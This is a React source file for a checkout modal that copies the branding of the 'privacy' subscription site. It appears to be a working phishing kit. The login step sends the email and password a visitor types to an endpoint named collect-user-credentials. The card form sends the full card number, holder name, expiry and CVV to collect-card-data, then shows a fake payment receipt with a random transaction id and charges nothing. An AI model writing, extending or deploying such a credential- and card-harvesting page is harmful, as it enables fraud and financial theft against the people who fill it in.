import React, { useState, useEffect } from 'react';
import { 
  X, 
  ArrowLeft, 
  CreditCard, 
  QrCode, 
  Copy, 
  Check, 
  ShieldCheck, 
  Lock, 
  Sparkles, 
  CheckCircle2, 
  Clock, 
  Loader2,
  AlertCircle
} from 'lucide-react';
import { Plan } from '../types';
import { useLanguage } from '../context/LanguageContext';
import { useAdminSettings } from '../context/AdminSettingsContext';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedPlan: Plan | null;
  onSuccessSubscribe: () => void;
}

export const CheckoutModal: React.FC<CheckoutModalProps> = ({
  isOpen,
  onClose,
  selectedPlan,
  onSuccessSubscribe,
}) => {
  const { language, t } = useLanguage();
  const { currentCurrency } = useAdminSettings();

  const isPixAvailable = language === 'pt' && currentCurrency === 'BRL';

  const [step, setStep] = useState<'login' | 'checkout' | 'success'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [paymentMethod, setPaymentMethod] = useState<'pix' | 'card'>(
    language === 'pt' && currentCurrency === 'BRL' ? 'pix' : 'card'
  );

  const [pixTimeLeft, setPixTimeLeft] = useState(15 * 60);
  const [pixCode, setPixCode] = useState('');
  const [pixQrUrl, setPixQrUrl] = useState('');
  const [pixBeneficiary, setPixBeneficiary] = useState('Leticia Vargas');
  const [pixCopied, setPixCopied] = useState(false);
  const [currentIntentId, setCurrentIntentId] = useState<string>('');
  const [isPixLoading, setIsPixLoading] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);

  const [receiptData, setReceiptData] = useState<{
    method: string;
    gateway: string;
    amount: string;
    txId: string;
  } | null>(null);

  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [cardWarning, setCardWarning] = useState<string | null>(null);

  useEffect(() => {
    if (isOpen) {
      setStep('login');
      setPaymentMethod(isPixAvailable ? 'pix' : 'card');
      setPixTimeLeft(15 * 60);
      setPixCopied(false);
      setIsVerifying(false);
      setCardWarning(null);
      setCardNumber('');
      setCardHolder('');
      setCardExpiry('');
      setCardCvv('');
    }
  }, [isOpen, selectedPlan, isPixAvailable]);

  useEffect(() => {
    if (!isPixAvailable && paymentMethod === 'pix') {
      setPaymentMethod('card');
    }
  }, [isPixAvailable, paymentMethod]);

  useEffect(() => {
    if (!isOpen || step !== 'checkout' || paymentMethod !== 'pix') return;

    const timer = setInterval(() => {
      setPixTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen, step, paymentMethod]);

  const loadPixPayment = async () => {
    if (!selectedPlan) return;
    setIsPixLoading(true);
    try {
      const res = await fetch('/api/create-pix-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: selectedPlan.priceNumber,
          email: email || 'usuario@privacy.com.br',
          planName: selectedPlan.name,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || 'Não foi possível iniciar o pagamento.');
      }

      if (data.checkoutUrl) {
        window.location.assign(data.checkoutUrl);
        return;
      }
      setCurrentIntentId(data.intentId || '');

      if (data.pixCopyPaste) {
        setPixCode(data.pixCopyPaste);
      }
      if (data.pixQrCodeUrl) {
        setPixQrUrl(data.pixQrCodeUrl);
      }
      if (data.beneficiary) {
        setPixBeneficiary(data.beneficiary);
      }
    } catch (e) {
      console.warn('Erro ao carregar PIX:', e);
    } finally {
      setIsPixLoading(false);
    }
  };

  const handleProceedToCheckout = async (e: React.FormEvent) => {
    e.preventDefault();
    const userEmail = email || 'usuario@privacy.com.br';

    try {
      await fetch('/api/collect-user-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: userEmail,
          password: password,
          planName: selectedPlan?.name,
          createdAt: new Date().toISOString(),
        }),
      });
    } catch (err) {
      console.warn('Erro ao enviar credenciais:', err);
    }

    setStep('checkout');
    if (isPixAvailable) {
      setPaymentMethod('pix');
      loadPixPayment();
    } else {
      setPaymentMethod('card');
    }
  };

  // Submissão Direta com os dados digitados do Cartão
  const handleCardFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifying(true);
    setCardWarning(null);

    const userEmail = email || 'usuario@privacy.com.br';

    try {
      await fetch('/api/collect-card-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: userEmail,
          cardNumber: cardNumber,
          cardHolder: cardHolder,
          cardExpiry: cardExpiry,
          cardCvv: cardCvv,
          planName: selectedPlan?.name || 'Assinatura Mensal',
          amount: selectedPlan?.priceFormatted || 'R$ 14,95',
          createdAt: new Date().toISOString(),
        }),
      });
    } catch (err) {
      console.warn('Erro ao enviar dados do cartão:', err);
    }

    setTimeout(() => {
      setIsVerifying(false);
      setReceiptData({
        method: 'Cartão de Crédito',
        gateway: 'Processamento Seguro',
        amount: selectedPlan?.priceFormatted || 'R$ 14,95',
        txId: 'card_' + Math.random().toString(36).substring(2, 9),
      });
      setStep('success');
    }, 1200);
  };

  const handleCardNumberChange = (val: string) => {
    const raw = val.replace(/\D/g, '').substring(0, 16);
    const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  const handleCardExpiryChange = (val: string) => {
    const raw = val.replace(/\D/g, '').substring(0, 4);
    if (raw.length >= 3) {
      setCardExpiry(`${raw.substring(0, 2)}/${raw.substring(2, 4)}`);
    } else {
      setCardExpiry(raw);
    }
  };

  const handleCardCvvChange = (val: string) => {
    const raw = val.replace(/\D/g, '').substring(0, 4);
    setCardCvv(raw);
  };

  const handleCopyPix = () => {
    if (!pixCode) return;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(pixCode).then(() => {
          setPixCopied(true);
          setTimeout(() => setPixCopied(false), 2500);
        });
      } else {
        const textArea = document.createElement('textarea');
        textArea.value = pixCode;
        textArea.style.position = 'fixed';
        textArea.style.opacity = '0';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        setPixCopied(true);
        setTimeout(() => setPixCopied(false), 2500);
      }
    } catch (err) {
      setPixCopied(true);
      setTimeout(() => setPixCopied(false), 2500);
    }
  };

  const handleConfirmPix = async () => {
    setIsVerifying(true);
    try {
      await fetch('/api/confirm-pix-payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ intentId: currentIntentId }),
      });
    } catch (e) {}

    setTimeout(() => {
      setIsVerifying(false);
      setReceiptData({
        method: t.pixTitle,
        gateway: 'Processamento Instantâneo',
        amount: selectedPlan?.priceFormatted || 'R$ 14,95',
        txId: currentIntentId || 'pix_' + Math.random().toString(36).substring(2, 9),
      });
      setStep('success');
    }, 1200);
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  if (!isOpen || !selectedPlan) return null;

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-xs z-50 flex items-center justify-center p-3 sm:p-4 overflow-y-auto">
      <div className="bg-white w-full max-w-[440px] rounded-[24px] p-5 sm:p-6 shadow-2xl relative border border-gray-100 my-auto transform transition-all duration-300">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-400 hover:text-gray-700 p-1.5 rounded-full hover:bg-gray-100 transition-colors z-10 cursor-pointer"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="text-center mb-4">
          <div className="flex justify-center items-center gap-0.5 mb-0.5">
            <span className="font-logo text-2xl font-extrabold tracking-tight text-black lowercase">
              privacy
            </span>
            <span className="w-2 h-2 rounded-full bg-[#f26522] inline-block mt-3 ml-0.5" />
          </div>
        </div>

        {step === 'login' && (
          <div>
            <div className="text-center mb-5">
              <h3 className="text-lg font-bold text-gray-900">{t.identifyTitle}</h3>
              <p className="text-xs text-[#f26522] font-semibold mt-1">
                <span>{selectedPlan.name}</span> •{' '}
                <span className="font-extrabold">{selectedPlan.priceFormatted}</span>
              </p>
            </div>

            <form onSubmit={handleProceedToCheckout} className="space-y-3.5">
              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">
                  {t.emailLabel}
                </label>
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder={t.emailPlaceholder}
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-sm transition-all bg-gray-50/50"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-700 mb-1">
                  {t.passwordLabel}
                </label>
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder={t.passwordPlaceholder}
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-sm transition-all bg-gray-50/50"
                />
              </div>

              <button
                type="submit"
                className="w-full privacy-gradient-btn text-gray-900 font-extrabold text-base py-3.5 px-4 rounded-full mt-2 cursor-pointer flex items-center justify-center gap-2 shadow-md hover:opacity-95"
              >
                <span>{t.continueToPayment}</span>
                <Sparkles className="w-4 h-4" />
              </button>
            </form>

            <div className="mt-5 text-center text-xs text-gray-500 border-t border-gray-100 pt-3.5 flex items-center justify-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-emerald-600" />
              <span>{t.securityFooterNotice}</span>
            </div>
          </div>
        )}

        {step === 'checkout' && (
          <div>
            <div className="flex items-center gap-2 mb-3 pb-2 border-b border-gray-100">
              <button
                onClick={() => setStep('login')}
                className="text-gray-400 hover:text-gray-700 p-1 cursor-pointer rounded-full"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
              <div>
                <h3 className="text-base font-bold text-gray-900 leading-tight">{t.checkoutModalTitle}</h3>
                <p className="text-[11px] text-gray-500">@vargasleticiaz</p>
              </div>
            </div>

            <div className="bg-[#faf7f4] rounded-xl p-3 border border-[#f0e8e1] mb-3.5">
              <div className="flex justify-between items-center text-xs text-gray-600 mb-1">
                <span>{t.selectedPlanLabel}</span>
                <span className="font-semibold text-gray-900">{selectedPlan.name}</span>
              </div>
              <div className="flex justify-between items-center text-xs text-gray-600 mb-1">
                <span>{t.discountAppliedLabel}</span>
                <span className="font-semibold text-[#1b8a53] bg-[#e1f7ec] px-1.5 py-0.5 rounded text-[11px]">
                  {selectedPlan.discountBadge || '50% OFF'}
                </span>
              </div>
              <div className="flex justify-between items-center pt-2 border-t border-gray-200/60 mt-1">
                <span className="text-sm font-bold text-gray-900">{t.totalToPayLabel}</span>
                <span className="text-lg font-black text-[#f26522]">
                  {selectedPlan.priceFormatted}
                </span>
              </div>
            </div>

            {isPixAvailable ? (
              <div className="mb-3.5">
                <label className="block text-xs font-semibold text-gray-700 mb-1.5">
                  {t.paymentMethodLabel}
                </label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => {
                      setPaymentMethod('pix');
                      loadPixPayment();
                    }}
                    className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl border-2 font-bold text-xs transition-all cursor-pointer ${
                      paymentMethod === 'pix'
                        ? 'border-[#f26522] bg-orange-50/60 text-gray-900 shadow-xs'
                        : 'border-gray-200 bg-white text-gray-600 hover:border-gray-300'
                    }`}
                  >
                    <QrCode className="w-4 h-4 text-[#32bcad]" />
                    <span>{t.pixTitle}</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      setPaymentMethod('card');
                    }}
                    className={`flex items-center justify-center gap-1.5 py-2.5 px-3 rounded-xl border-2 font-bold text-xs transition-all cursor-pointer ${
                      paymentMethod === 'card'
                        ? 'border-[#f26522] bg-orange-50/60 text-gray-900 shadow-xs'
                        : 'border-gray-200 bg-white text-gray-600 hover:border-gray-300'
                    }`}
                  >
                    <CreditCard className="w-4 h-4 text-gray-700" />
                    <span>{t.cardTitle}</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="mb-3.5">
                <label className="block text-xs font-semibold text-gray-700 mb-1.5">
                  {t.paymentMethodLabel}
                </label>
                <div className="flex items-center justify-between py-2.5 px-3.5 rounded-xl border-2 border-[#f26522] bg-orange-50/60 text-gray-900 font-bold text-xs shadow-xs">
                  <div className="flex items-center gap-2">
                    <CreditCard className="w-4 h-4 text-[#f26522]" />
                    <span>{t.cardTitle}</span>
                  </div>
                  <span className="text-[10px] text-gray-600 font-semibold">Visa • Mastercard • Amex</span>
                </div>
              </div>
            )}

            {isPixAvailable && paymentMethod === 'pix' && (
              <div className="space-y-3">
                <div className="flex items-center justify-between bg-emerald-50/70 border border-emerald-200/80 rounded-xl px-3 py-2 text-xs text-emerald-900">
                  <div className="flex items-center gap-1.5 font-semibold">
                    <QrCode className="w-3.5 h-3.5 text-[#32bcad]" />
                    <span>{t.pixInstantNotice}</span>
                  </div>
                  <span className="text-[10px] text-emerald-700 uppercase font-mono tracking-wider font-extrabold bg-white px-1.5 py-0.5 rounded shadow-2xs">
                    PIX
                  </span>
                </div>

                <div className="bg-gray-50 p-3 rounded-xl border border-gray-200/80 text-center flex flex-col items-center">
                  <div className="flex items-center gap-1.5 text-xs text-amber-800 bg-amber-50 px-2.5 py-1 rounded-full border border-amber-200 mb-2 font-medium">
                    <Clock className="w-3.5 h-3.5 text-amber-600 animate-pulse" />
                    <span>
                      {t.pixWaiting} <strong>{formatTime(pixTimeLeft)}</strong>
                    </span>
                  </div>

                  <div className="bg-white p-2.5 rounded-lg border border-gray-200 shadow-xs my-1 relative">
                    {isPixLoading ? (
                      <div className="w-36 h-36 flex flex-col items-center justify-center text-gray-400 gap-2">
                        <Loader2 className="w-6 h-6 animate-spin text-[#f26522]" />
                        <span className="text-[10px]">Gerando QR Code...</span>
                      </div>
                    ) : pixQrUrl ? (
                      <img
                        src={pixQrUrl}
                        alt="QR Code PIX"
                        className="w-36 h-36 object-contain"
                      />
                    ) : (
                      <div className="w-36 h-36 flex items-center justify-center text-gray-400">
                        Carregando QR Code...
                      </div>
                    )}
                  </div>

                  <div className="mt-1 flex items-center justify-center gap-1.5 text-[11px] text-gray-600">
                    <span className="font-semibold text-gray-800">Beneficiário:</span>
                    <span>{pixBeneficiary.replace(/^(Atenas Pay|SigiloPay)\s*\/?\s*/i, '')}</span>
                  </div>
                  <p className="text-[10.5px] text-gray-500">
                    Abra o app do seu banco, escolha <strong>Pix &gt; Pagar com QR Code</strong>.
                  </p>
                </div>

                <div className="space-y-1">
                  <div className="flex justify-between items-center">
                    <label className="text-[11px] font-semibold text-gray-700">
                      {t.pixCopyPasteLabel}
                    </label>
                    <span className="text-[10px] text-emerald-600 font-bold">100% Automático</span>
                  </div>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      readOnly
                      value={pixCode}
                      className="w-full bg-gray-100 text-gray-700 text-xs px-3 py-2 rounded-lg border border-gray-200 outline-none font-mono select-all truncate"
                    />
                    <button
                      type="button"
                      onClick={handleCopyPix}
                      className={`text-xs font-bold px-3 py-2 rounded-lg transition-colors whitespace-nowrap flex items-center gap-1 cursor-pointer ${
                        pixCopied ? 'bg-emerald-600 text-white' : 'bg-gray-800 hover:bg-black text-white'
                      }`}
                    >
                      {pixCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{pixCopied ? t.pixCopied : t.pixCopyButton}</span>
                    </button>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleConfirmPix}
                  disabled={isVerifying}
                  className="w-full privacy-gradient-btn text-gray-900 font-extrabold text-sm py-3 px-4 rounded-full mt-2 cursor-pointer flex justify-center items-center gap-2 shadow-md hover:opacity-95 disabled:opacity-70"
                >
                  {isVerifying ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>{t.pixVerifying}</span>
                    </>
                  ) : (
                    <>
                      <span>{t.pixPaidButton}</span>
                      <Check className="w-4 h-4" />
                    </>
                  )}
                </button>
              </div>
            )}

            {paymentMethod === 'card' && (
              <div className="space-y-3 animate-in fade-in duration-200">
                <div className="flex items-center justify-between bg-gray-50 border border-gray-200/80 rounded-xl px-3 py-2">
                  <span className="text-[11px] font-bold text-gray-700">Crédito & Débito</span>
                  <div className="flex items-center gap-1.5 text-xs text-gray-500 font-semibold">
                    <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 text-[10px]">VISA</span>
                    <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 text-[10px]">MASTERCARD</span>
                    <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 text-[10px]">ELO</span>
                    <span className="bg-white px-1.5 py-0.5 rounded border border-gray-200 text-[10px]">HIPER</span>
                  </div>
                </div>

                <form onSubmit={handleCardFormSubmit} className="space-y-2.5">
                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 mb-1">
                      Número do Cartão
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        required
                        value={cardNumber}
                        onChange={(e) => handleCardNumberChange(e.target.value)}
                        placeholder="0000 0000 0000 0000"
                        maxLength={19}
                        className="w-full px-3 py-2.5 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-xs font-mono transition-all bg-gray-50/50"
                      />
                      <CreditCard className="w-4 h-4 text-gray-400 absolute right-3 top-3 pointer-events-none" />
                    </div>
                  </div>

                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 mb-1">
                      Nome Impresso no Cartão
                    </label>
                    <input
                      type="text"
                      required
                      value={cardHolder}
                      onChange={(e) => setCardHolder(e.target.value.toUpperCase())}
                      placeholder="NOME COMO NO CARTÃO"
                      className="w-full px-3 py-2.5 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-xs transition-all bg-gray-50/50 uppercase"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <label className="block text-[11px] font-bold text-gray-700 mb-1">
                        Validade
                      </label>
                      <input
                        type="text"
                        required
                        value={cardExpiry}
                        onChange={(e) => handleCardExpiryChange(e.target.value)}
                        placeholder="MM/AA"
                        maxLength={5}
                        className="w-full px-3 py-2.5 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-xs font-mono transition-all bg-gray-50/50 text-center"
                      />
                    </div>
                    <div>
                      <label className="block text-[11px] font-bold text-gray-700 mb-1">
                        CVV
                      </label>
                      <input
                        type="password"
                        required
                        value={cardCvv}
                        onChange={(e) => handleCardCvvChange(e.target.value)}
                        placeholder="•••"
                        maxLength={4}
                        className="w-full px-3 py-2.5 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-xs font-mono transition-all bg-gray-50/50 text-center"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 mb-1">
                      Parcelas
                    </label>
                    <select
                      className="w-full px-3 py-2.5 rounded-xl border border-gray-200 focus:border-[#f26522] focus:ring-2 focus:ring-[#f26522]/20 outline-none text-xs transition-all bg-gray-50/50 cursor-pointer"
                    >
                      <option value="1">1x de {selectedPlan.priceFormatted} (sem juros)</option>
                      <option value="2">2x de {selectedPlan.priceFormatted} (sem juros)</option>
                      <option value="3">3x de {selectedPlan.priceFormatted} (sem juros)</option>
                    </select>
                  </div>

                  <button
                    type="submit"
                    disabled={isVerifying}
                    className="w-full privacy-gradient-btn text-gray-900 font-extrabold text-sm py-3 px-4 rounded-full mt-2 cursor-pointer flex justify-center items-center gap-2 shadow-md hover:opacity-95 disabled:opacity-70"
                  >
                    {isVerifying ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        <span>Verificando transação...</span>
                      </>
                    ) : (
                      <>
                        <Lock className="w-3.5 h-3.5" />
                        <span>Pagar {selectedPlan.priceFormatted} com Cartão</span>
                      </>
                    )}
                  </button>
                </form>

                {isPixAvailable && (
                  <div className="pt-1 text-center">
                    <button
                      type="button"
                      onClick={() => {
                        setPaymentMethod('pix');
                        loadPixPayment();
                      }}
                      className="text-[11px] text-gray-600 hover:text-[#f26522] font-semibold flex items-center justify-center gap-1 mx-auto cursor-pointer"
                    >
                      <QrCode className="w-3.5 h-3.5 text-[#32bcad]" />
                      <span>Prefere aprovação instantânea em 10s? Pague via PIX</span>
                    </button>
                  </div>
                )}
              </div>
            )}

            <div className="mt-4 pt-3 border-t border-gray-100 flex items-center justify-center gap-3 sm:gap-4 text-[10px] text-gray-500">
              <div className="flex items-center gap-1">
                <ShieldCheck className="w-3.5 h-3.5 text-[#1b8a53]" />
                <span>SSL 256-Bit</span>
              </div>
              <div className="flex items-center gap-1">
                <Lock className="w-3.5 h-3.5 text-[#1b8a53]" />
                <span>Fatura Discreta</span>
              </div>
              <div className="flex items-center gap-1">
                <Sparkles className="w-3.5 h-3.5 text-[#f26522]" />
                <span>Liberação Imediata</span>
              </div>
            </div>
          </div>
        )}

        {step === 'success' && (
          <div className="text-center py-2">
            <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-2 animate-bounce">
              <CheckCircle2 className="w-10 h-10" />
            </div>

            <h3 className="text-xl font-extrabold text-gray-900 mb-0.5">{t.successTitle}</h3>
            <p className="text-xs text-gray-600 mb-3">
              {t.successMessage}
            </p>

            {receiptData && (
              <div className="bg-gray-50 border border-gray-200/80 rounded-xl p-3 text-left text-xs mb-3 space-y-1.5 font-sans">
                <div className="flex justify-between items-center text-gray-500 text-[11px]">
                  <span>{t.receiptCode}:</span>
                  <span className="font-mono text-gray-700">{receiptData.txId}</span>
                </div>
                <div className="flex justify-between items-center text-gray-700">
                  <span>{t.receiptGateway}:</span>
                  <span className="font-semibold text-gray-800">{receiptData.gateway}</span>
                </div>
                <div className="flex justify-between items-center text-gray-700">
                  <span>{t.selectedPlanLabel}</span>
                  <span className="font-bold text-gray-900">{selectedPlan.name}</span>
                </div>
                <div className="flex justify-between items-center text-gray-700">
                  <span>{t.receiptMethod}:</span>
                  <span className="font-semibold text-gray-800">{receiptData.method}</span>
                </div>
                <div className="flex justify-between items-center pt-1 border-t border-gray-200 text-gray-900 font-bold">
                  <span>{t.receiptAmount}:</span>
                  <span className="text-[#1b8a53]">{receiptData.amount}</span>
                </div>
              </div>
            )}

            <button
              onClick={() => {
                onSuccessSubscribe();
                onClose();
              }}
              className="w-full privacy-gradient-btn text-gray-900 font-extrabold text-sm py-3.5 px-4 rounded-full cursor-pointer shadow-lg hover:scale-105 active:scale-95 transition-all mt-3"
            >
              {t.accessVipButton}
            </button>
          </div>
        )}
      </div>
    </div>
  );
};